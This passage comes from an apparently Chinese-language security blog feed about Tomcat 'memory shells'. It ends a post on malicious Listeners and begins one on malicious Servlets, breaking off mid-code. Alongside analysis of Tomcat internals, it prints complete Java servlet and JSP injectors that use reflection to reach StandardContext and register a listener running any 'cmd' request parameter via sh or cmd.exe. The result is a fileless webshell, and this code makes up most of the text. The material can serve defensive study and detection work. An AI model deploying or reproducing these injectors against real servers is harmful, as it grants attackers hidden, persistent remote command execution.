class="operator">=</span> (Request) field.get(request);</span><br><span class="line">            <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request1.getResponse();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] command = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Listener/5.png"></p><p>上文分析了如何构造恶意的Listener，接着来看看如何动态注册上文构造的恶意的Listener。在之前分析Tomcat Architecture时，提到过在org.apache.catalina.core.StandardContext类的startInternal方法中，会分别调用listenerStart、filterStart和loadOnStartup来分别触发Listener、Filter、Servlet的构造加载。</p><p>跟进org.apache.catalina.core.StandardContext#listenerStart方法，该方法调用org.apache.catalina.core.StandardContext#findApplicationListeners方法来获取listeners数组，接着挨个从listeners数组取出并进行实例化，然后存入results数组中。</p><p>接着遍历results数组，根据不同类型的Listener，分别添加进eventListeners数组和lifecycleListeners数组。之后会调用org.apache.catalina.core.StandardContext#setApplicationEventListeners方法来清空applicationEventListenersList并重新赋值。而applicationEventListenersList中存放的正是之前实例化后的listener。</p><p><img src="/2024/05/18/Tomcat-Listener/6.png"></p><p><img src="/2024/05/18/Tomcat-Listener/7.png"></p><p><img src="/2024/05/18/Tomcat-Listener/8.png"></p><p>通过上文的分析中可以知道，org.apache.catalina.core.StandardContext#listenerStart方法会将Listener实例化后添加到applicationEventListenersList中，接着来看看如何触发实例化的Listener。</p><p>在Demo中的requestInitialized方法中下断点，看看在requestInitialized方法前实现了调用了一些什么方法。跟进org.apache.catalina.core.StandardContext#fireRequestInitEvent方法，该方法调用了org.apache.catalina.core.StandardContext#getApplicationEventListeners方法，而getApplicationEventListeners方法中返回的正是前面的applicationEventListenersList。接着遍历instances数组，并调用每个listener的requestInitialized方法。因此如果能够在applicationEventListenersList中添加构造的恶意的Listener，则能调用到构造的恶意Listener。</p><p><img src="/2024/05/18/Tomcat-Listener/9.png"></p><p><img src="/2024/05/18/Tomcat-Listener/10.png"></p><h2 id="Achievement"><a href="#Achievement" class="headerlink" title="Achievement"></a>Achievement</h2><h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h3><p>动态注入Listener内存马的具体思路如下:</p><ul><li>继承并编写一个恶意Listener；</li><li>获取StandardContext；</li><li>调用StandardContext#addApplicationEventListener添加恶意Listener。</li></ul><h3 id="Dynamic-Registration"><a href="#Dynamic-Registration" class="headerlink" title="Dynamic Registration"></a>Dynamic Registration</h3><h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;ListenerMemoryShellServlet&quot;, value = &quot;/ListenerMemoryShellServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenerMemoryShellServlet</span> <span class="keyword">extends</span> <span class="title class_">HelloServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doGet(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">                    <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) sre.getServletRequest();</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                        <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> RequestFacade.class.getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                        requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestField.get(requestFacade);</span><br><span class="line">                        <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                                isLinux = <span class="literal">false</span>;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            String[] command = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">                            <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                            response.getWriter().write(output);</span><br><span class="line">                            response.getWriter().flush();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            standardContext.addApplicationEventListener(listener);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Listener/11.png"></p><h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) sre.getServletRequest();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> RequestFacade.class.getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestField.get(requestFacade);</span><br><span class="line">                <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String[] command = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    response.getWriter().write(output);</span><br><span class="line">                    response.getWriter().flush();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    standardContext.addApplicationEventListener(listener);</span><br><span class="line">    response.getWriter().write(<span class="string">&quot;Listener Inject Successfully...&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Listener/12.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MemoryShell </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat MemoryShell Of Servlet</title>
      <link href="/2024/05/18/Tomcat-Servlet/"/>
      <url>/2024/05/18/Tomcat-Servlet/</url>
      
        <content type="html"><![CDATA[<h2 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h2><p>在Tomcat架构中，Servlet的生命周期分为五个部分：</p><ul><li>加载阶段：当Tomcat第一次访问Servlet时，会创建Servlet的实例。</li><li>初始化阶段：当Servlet实例化后，Tomcat会调用init方法初始化这个对象。</li><li>处理服务阶段：当浏览器访问Servlet时，Servlet会调用service方法处理请求。</li><li>销毁阶段：当Tomcat关闭时或者检测到Servlet要从Tomcat删除时，会自动调用destroy方法，让该实例释放掉所占的资源。除此之外，一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁。</li><li>卸载阶段：当Servlet调用完destroy方法后，会等待垃圾回收。如果有需要再次使用这个Servlet时，会重新调用init方法进行初始化操作。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line"><span class="comment">// 由servlet容器调用，向servlet表明该servlet正在被投入服务。</span></span><br><span class="line"><span class="comment">// 在实例化servlet之后，servlet容器正好调用init方法一次。在servlet可以接收任何请求之前，init方法必须成功完成。</span></span><br><span class="line"><span class="comment">// 如果init方法出现以下情况，servlet容器就不能将servlet放入服务中</span></span><br><span class="line"><span class="comment">// 抛出一个ServletException</span></span><br><span class="line"><span class="comment">// 在Web服务器定义的时间段内没有返回</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回一个ServletConfig对象，其中包含该Servlet的初始化和启动参数。返回的ServletConfig对象是传递给init方法的对象。</span></span><br><span class="line"><span class="comment">// 这个接口的实现负责存储ServletConfig对象，以便这个方法能够返回它。实现这个接口的GenericServlet类已经做到了这一点。</span></span><br><span class="line"><span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span>;  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 由servlet容器调用，允许servlet对请求作出响应。</span></span><br><span class="line"><span class="comment">// 这个方法只有在servlet的init()方法成功完成后才会被调用。</span></span><br><span class="line"><span class="comment">// 对于抛出或发送错误的servlet，响应的状态代码总是应该被设置。</span></span><br><span class="line"><span class="comment">// Servlet通常在多线程的Servlet容器内运行，可以同时处理多个请求。开发人员必须注意同步访问任何共享资源，如文件、网络连接和以及servlet的类和实例变量。关于Java中多线程编程的更多信息，可以在Java多线程编程教程中找到。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回有关Servlet的信息，如作者、版本和版权。</span></span><br><span class="line"><span class="comment">// 该方法返回的字符串应该是纯文本，而不是任何形式的标记（如HTML、XML等）。</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 由servlet容器调用，向servlet表明该servlet将被退出服务。只有在servlet的服务方法中的所有线程都退出后，或者在超时期过后，才会调用这个方法。在servlet容器调用该方法后，它将不再调用该servlet的服务方法。</span></span><br><span class="line">    <span class="comment">// 这个方法给了servlet一个机会来清理任何被保留的资源（例如，内存、文件句柄、线程），并确保任何持久化状态与servlet在内存中的当前状态同步。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Process-Analysis"><a href="#Process-Analysis" class="headerlink" title="Process Analysis"></a>Process Analysis</h2><p>与Filter内存马类似，在javax.servlet.ServletContext中同样存在着addServlet和createServlet方法。</p><p><img src="/2024/05/18/Tomcat-Servlet/1.png"></p><p>跟进addServlet的实现方法org.apache.catalina.core.ApplicationContext#addServlet，在该方法中，先对传入的servletName进行检测，为空时会抛出异常。接着判断context的生命周期，如果处于LifecycleState.STARTING_PREP状态，同样会抛出异常。接着通过servletName从context中寻找相关联的子容器，并将其转换成Wrapper对象，当不存在时，会创建一个名字为servletName的wrapper，再将创建的wrapper添加到context的子容器中。最后判断servlet是否为null，当servlet &#x3D;&#x3D; null时，会将传入的servletClass设置进wrapper中。最后调用org.apache.catalina.core.StandardContext#dynamicServletAdded方法进行servlet动态加载。</p><p><img src="/2024/05/18/Tomcat-Servlet/2.png"></p><p>跟进org.apache.catalina.core.StandardContext#dynamicServletAdded方法，实例化一个ApplicationServletRegistration对象。</p><p><img src="/2024/05/18/Tomcat-Servlet/3.png"></p><p><img src="/2024/05/18/Tomcat-Servlet/4.png"></p><p>在org.apache.catalina.core.StandardContext#startInternal方法中，注意到servlet构造时调用的loadOnStartup方法中，会获取loadOnStartup的值，此时只有loadOnStartup的值大于0才会进行wrapper的加载。</p><p><img src="/2024/05/18/Tomcat-Servlet/5.png"></p><h2 id="Achievement"><a href="#Achievement" class="headerlink" title="Achievement"></a>Achievement</h2><h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h3><p>动态注入Servlet内存马的具体思路如下:</p><ol><li>调用StandardContext.createWrapper为servlet创建wrapper；</li><li>配置LoadOnStartup启动优先级；</li><li>配置ServletName；</li><li>配置ServletClass；</li><li>addChild添加wrapper到Context；</li><li>addServletMapping添加映射。</li></ol><h3 id="Dynamic-Registration"><a href="#Dynamic-Registration" class="headerlink" title="Dynamic Registration"></a>Dynamic Registration</h3><h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Wrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;ServletMemoryShellServlet&quot;, value = &quot;/ServletMemoryShellServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletMemoryShellServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span 